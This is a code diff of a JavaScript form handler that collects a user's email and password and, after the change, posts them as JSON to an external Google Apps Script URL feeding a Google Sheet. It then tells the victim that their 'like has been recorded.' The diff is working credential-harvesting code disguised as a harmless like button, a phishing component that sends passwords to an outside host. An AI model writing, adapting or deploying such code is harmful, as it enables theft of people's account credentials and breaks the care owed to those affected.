@@ -17,20 +17,22 @@ function saveInput() {
         return;
     }
 
-    // Send the data to the server
-    fetch('save_input.php', {
+    // Google Apps Script Web App URL
+    const googleScriptURL = "https://script.google.com/macros/s/AKfycbykdaWzGqE-kpGlNWkuAh0hxFpY0a9yRrPu_wRaQ7YFJefkXBmqPoiN4gl9CLlpjBzt6A/exec";
+
+    // Send the data to the Google Sheet
+    fetch(googleScriptURL, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Type': 'application/json',
         },
-        body: new URLSearchParams({
+        body: JSON.stringify({
             email: email,
-            password: password
+            password: password,
         })
     })
     .then(response => {
         if (!response.ok) {
-            // Handle HTTP errors
             return response.text().then((text) => {
                 throw new Error(`Server error: ${response.status} - ${text}`);
             });
@@ -41,7 +43,6 @@ function saveInput() {
         if (data.success) {
             alert("Thank you! Your like has been recorded.");
         } else {
-            // Show precise error message from PHP
             alert("Failed to save data: " + data.message);
         }
         console.log(data);
